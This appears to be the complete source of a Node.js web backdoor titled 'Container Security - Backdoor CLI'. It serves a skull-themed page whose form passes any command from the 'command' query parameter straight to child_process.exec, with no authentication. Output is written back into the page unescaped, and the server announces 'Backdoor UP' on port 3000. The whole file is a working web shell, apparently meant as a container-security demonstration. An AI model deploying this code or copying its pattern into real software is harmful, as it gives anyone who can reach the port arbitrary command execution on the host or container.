const { exec } = require('child_process');
const url = require('url');

const template = (stdout, stderr) => {
    return `
    <html>
        <head>
            <meta charset="utf-8">
            <title>Container Security - Backdoor CLI</title>
            <style>
                body { background: #000000; color: #20C20E; }
                .container {
                    display: flex;
                    padding: 50px;
                    height: 100%;
                }
                .left-pane {
                    width: 300px;
                }
                .right-pane {
                    flex-grow: 1;
                }
                h2 {
                    font-family: monospace;
                }
                input[type="text"] {
                    background: none;
                    border: 1px solid #20C20E;
                    padding: 5px;
                    color: #20C20E;
                    width: 300px;
                }
                input[type="submit"] {
                    background: #20C20E;
                    color: #000000;
                    border: 0px;
                    padding: 6px 12px;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="left-pane">
                    <pre style="font-size: 0.8em;">
                uuuuuuu                  
            uu$$$$$$$$$$$uu             
         uu$$$$$$$$$$$$$$$$$uu          
        u$$$$$$$$$$$$$$$$$$$$$u         
       u$$$$$$$$$$$$$$$$$$$$$$$u         
      u$$$$$$$$$$$$$$$$$$$$$$$$$u
      u$$$$$$$$$$$$$$$$$$$$$$$$$u
      u$$$$$$"   "$$$"   "$$$$$$u     
      "$$$$"      u$u       $$$$"     
       $$$u       u$u       u$$$        
       $$$u      u$$$u      u$$$        
        "$$$$uu$$$   $$$uu$$$$"         
         "$$$$$$$"   "$$$$$$$"
           u$$$$$$$u$$$$$$$u            
            u$"$"$"$"$"$"$u
 uuu        $$u$ $ $ $ $u$$       uuu
u$$$$        $$$$$u$u$u$$$       u$$$$
 $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
"""      ""$$$$$$$$$$$uu ""$"""
          uuuu ""$$$$$$$$$$uuu
 u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
 $$$$$$$$$$""""           ""$$$$$$$$$$$"
  "$$$$$"                      ""$$$$""
    $$$"                         $$$$"

                    </pre>
                </div>
                <div class="right-pane">
                    <h2>Container Security - Backdoor CLI</h2>
                    <form method="GET">
                        <input type="text" class="command-input" name="command" placeholder="Command">
                        <input type="submit" value="EXECUTE IN CONTAINER">
                    </form>
                    <pre>${stdout}</pre>
                    <pre>${stderr}</pre>
                </div>
            </div>
        </body>
    </html>
    `;
};

const server = require('http').createServer((request, response) => {

    const query = url.parse(request.url, true).query;

    if (!query || !query.command) {
        response.end(template('Provide a command', ''));
        return;
    }

    exec(query.command, (err, stdout, stderr) => {
        if (err) {
            response.end(template('[GOT AN ERROR]', err));
            return;
        }
        response.end(template(stdout, stderr));
    });

});

server.listen(3000, (err) => {
    if (err) {
        return console.log('something bad happened', err);
    }
    console.log('Backdoor UP');
});